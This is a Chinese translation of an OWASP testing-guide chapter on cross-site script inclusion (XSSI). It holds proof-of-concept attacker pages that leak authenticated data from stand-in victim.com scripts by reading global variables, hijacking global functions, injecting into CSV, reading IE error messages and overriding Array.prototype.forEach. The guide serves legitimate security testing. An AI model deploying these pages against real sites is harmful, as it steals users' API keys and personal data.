# 测试跨站脚本包含

|ID          |
|------------|
|WSTG-CLNT-13|

## 概述

跨站脚本包含（XSSI）漏洞允许跨来源或跨域边界的敏感数据泄露。敏感数据可能包括认证相关数据（登录状态、cookies、auth令牌、会话ID等）或用户的个人或敏感个人数据（电子邮件地址、电话号码、信用卡详细信息、社会安全号码等）。XSSI是一种类似于跨站请求伪造（CSRF）的客户端攻击，但目的不同。CSRF使用认证用户上下文在受害者页面上执行某些状态更改操作（例如，将钱转给攻击者账户、修改权限、重置密码等），而XSSI反而使用客户端JavaScript从认证会话中泄露敏感数据。

默认情况下，网站只允许访问来自同一来源的数据。这是一个关键应用程序安全原则，由同源策略（由[RFC 6454](https://tools.ietf.org/html/rfc6454)定义）管理。origin定义为URI方案（HTTP或HTTPS）、主机名和端口号的组合。但是，此策略不适用于HTML `<script>`标签包含。这种例外是必要的，因为没有它，网站将无法消费第三方服务、执行流量分析或使用广告平台等。

当浏览器打开带有`<script>`标签的网站时，资源从跨域获取。然后，资源在与包含站点或浏览器相同的上下文中运行，这为泄露敏感数据提供了机会。在大多数情况下，这是使用JavaScript实现的，但脚本源不必是类型为`text/javascript`或`.js`扩展名的JavaScript文件。

旧版浏览器（IE9/10）的漏洞允许通过JavaScript运行时错误消息在运行时泄露数据，但这些漏洞现已由供应商修补，被认为不太相关。通过设置`<script>`标签的charset属性，攻击者或测试人员可以强制UTF-16编码，在某些情况下允许其他数据格式（如JSON）的数据泄露。有关这些攻击的更多信息，请参阅[基于标识符的XSSI攻击](https://www.mbsd.jp/Whitepaper/xssi.pdf)。

## 测试目标

- 定位整个系统中的敏感数据。
- 评估通过各种技术泄露敏感数据的情况。

## 如何测试

### 使用认证和未认证用户会话收集数据

识别哪些端点负责发送敏感数据、需要哪些参数，并识别所有使用认证用户会话的动态和静态生成的JavaScript响应。特别注意使用[JSONP](https://en.wikipedia.org/wiki/JSONP)发送的敏感数据。要找到动态生成的JavaScript响应，生成认证和未认证请求，然后比较它们。如果不同，则意味着响应是动态的；否则是静态的。为简化此任务，可以使用[Veit Hailperin的Burp代理插件](https://github.com/luh2/DetectDynamicJS)等工具。请务必检查其他文件类型，而不仅仅是JavaScript；XSSI不限于JavaScript文件。

### 确定是否可以使用JavaScript泄露敏感数据

测试人员应分析代码，了解以下车辆是否存在XSSI漏洞的数据泄露：

1. 全局变量
2. 全局函数参数
3. 带引号盗窃的CSV（逗号分隔值）
4. JavaScript运行时错误
5. 使用`this`的原型链

### 1. 通过全局变量泄露敏感数据

API密钥存储在URI `https://victim.com/internal/api.js`上的JavaScript文件中，该文件在受害者网站`victim.com`上，仅供认证用户访问。攻击者配置网站`attackingwebsite.com`，并使用`<script>`标签引用JavaScript文件。

以下是`https://victim.com/internal/api.js`的内容：

```javascript
(function() {
  window.secret = "supersecretUserAPIkey";
})();
```

攻击网站`attackingwebsite.com`具有以下代码的`index.html`：

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Leaking data via global variables</title>
  </head>
  <body>
    <h1>Leaking data via global variables</h1>
    <script src="https://victim.com/internal/api.js"></script>
    <div id="result">
    </div>
    <script>
      var div = document.getElementById("result");
      div.innerHTML = "Your secret data <b>" + window.secret + "</b>";
    </script>
  </body>
</html>
```

在这个示例中，受害者使用`victim.com`进行了身份验证。攻击者通过社交工程、网络钓鱼邮件等引诱受害者访问`attackingwebsite.com`。然后受害者的浏览器获取`api.js`，导致敏感数据通过全局JavaScript变量泄露，并使用`innerHTML`显示。

### 2. 通过全局函数参数泄露敏感数据

此示例与前一个类似，只是`attackingwebsite.com`使用全局JavaScript函数通过覆盖受害者的全局JavaScript函数来提取敏感数据。

以下是`https://victim.com/internal/api.js`的内容：

```javascript
(function() {
  var secret = "supersecretAPIkey";
  window.globalFunction(secret);
})();
```

攻击网站`attackingwebsite.com`具有以下代码的`index.html`：

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Leaking data via global function parameters</title>
  </head>
  <body>
    <div id="result">
    </div>
    <script>
      function globalFunction(param) {
        var div = document.getElementById("result");
        div.innerHTML = "Your secret data: <b>" + param + "</b>";
      }
    </script>
    <script src="https://victim.com/internal/api.js"></script>
  </body>
</html>
```

还有其他XSSI漏洞可能导致通过JavaScript原型链或全局函数调用泄露敏感数据。有关这些攻击的更多信息，请参阅[动态JavaScript的危险意外攻击](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-lekies.pdf)。

### 3. 通过带引号盗窃的CSV泄露敏感数据

要泄露数据，攻击者/测试人员必须能够将JavaScript代码注入CSV数据。以下示例代码来自Takeshi Terada的[基于标识符的XSSI攻击](https://www.mbsd.jp/Whitepaper/xssi.pdf)白皮书。

```text
HTTP/1.1 200 OK
Content-Type: text/csv
Content-Disposition: attachment; filename="a.csv"
Content-Length: xxxx

1,"___","aaa@a.example","03-0000-0001"
2,"foo","bbb@b.example","03-0000-0002"
...
98,"bar","yyy@example.net","03-0000-0088"
99,"___","zzz@example.com","03-0000-0099"
```

在此示例中，使用`___`列作为注入点并在其中插入JavaScript字符串会产生以下结果。

```text
1,"\"",$$$=function(){/*","aaa@a.example","03-0000-0001"
2,"foo","bbb@b.example","03-0000-0002"
...
98,"bar","yyy@example.net","03-0000-0088"
99,"*/}//","zzz@example.com","03-0000-0099"
```

[Jeremiah Grossman在2006年写了关于Gmail中的类似漏洞](https://blog.jeremiahgrossman.com/2006/01/advanced-web-attack-techniques-using.html)，允许提取JSON中的用户联系人。在这种情况下，数据从Gmail接收，由浏览器JavaScript引擎使用未引用的Array构造函数解析以泄露数据。攻击者可以通过定义和覆盖内部Array构造函数来访问包含敏感数据的此Array：

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Leaking gmail contacts via JSON </title>
  </head>
  <body>
    <script>
      function Array() {
        // steal data
      }
    </script>
    <script src="https://mail.google.com/mail/?_url_scrubbed_"></script>
  </body>
</html>
```

### 4. 通过JavaScript运行时错误泄露敏感数据

浏览器通常呈现标准化的[JavaScript错误消息](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Errors)。但是，在IE9/10的情况下，运行时错误消息提供了可用于泄露数据的额外详细信息。例如，网站`victim.com`为认证用户提供URI `https://victim.com/service/csvendpoint`处的以下内容：

```text
HTTP/1.1 200 OK
Content-Type: text/csv
Content-Disposition: attachment; filename="a.csv"
Content-Length: 13

1,abc,def,ghi
```

此漏洞可以利用以下内容来利用：

```html
<!--error handler -->
<script>window.onerror = function(err) {alert(err)}</script>
<!--load target CSV -->
<script src="https://victim.com/service/csvendpoint"></script>
```

当浏览器尝试将CSV内容呈现为JavaScript时，它失败并泄露敏感数据：

![JavaScript运行时错误消息](images/XSSI1.jpeg)\
*图4.11.13-1：JavaScript运行时错误消息*

### 5. 通过使用`this`的原型链泄露敏感数据

在JavaScript中，`this`关键字是动态作用域的。这意味着如果函数在对象上调用，即使被调用的函数可能不属于对象本身，`this`也将指向此对象。此行为可用于泄露数据。在以下示例（来自[Sebastian Leike的演示页面](http://sebastian-lekies.de/leak/)）中，敏感数据存储在Array中。攻击者可以使用攻击者控制的函数覆盖`Array.prototype.forEach`。如果某些代码对包含敏感值的数组实例调用`forEach`函数，则将使用指向包含敏感数据的对象的`this`调用攻击者控制的函数。

以下是包含敏感数据的JavaScript文件`javascript.js`的摘录：

```javascript
...
(function() {
  var secret = ["578a8c7c0d8f34f5", "345a8b7c9d8e34f5"];

  secret.forEach(function(element) {
    // do something here
  });  
})();
...
```

敏感数据可以使用以下JavaScript代码泄露：

```html
...
 <div id="result">

    </div>
    <script>
      Array.prototype.forEach = function(callback) {
        var resultString = "Your secret values are: <b>";
        for (var i = 0, length = this.length; i < length; i++) {
          if (i > 0) {
            resultString += ", ";
          }
          resultString += this[i];
        }
        resultString += "</b>";
        var div = document.getElementById("result");
        div.innerHTML = resultString;
      };
    </script>
    <script src="https://victim.com/..../javascript.js"></script>
...
```
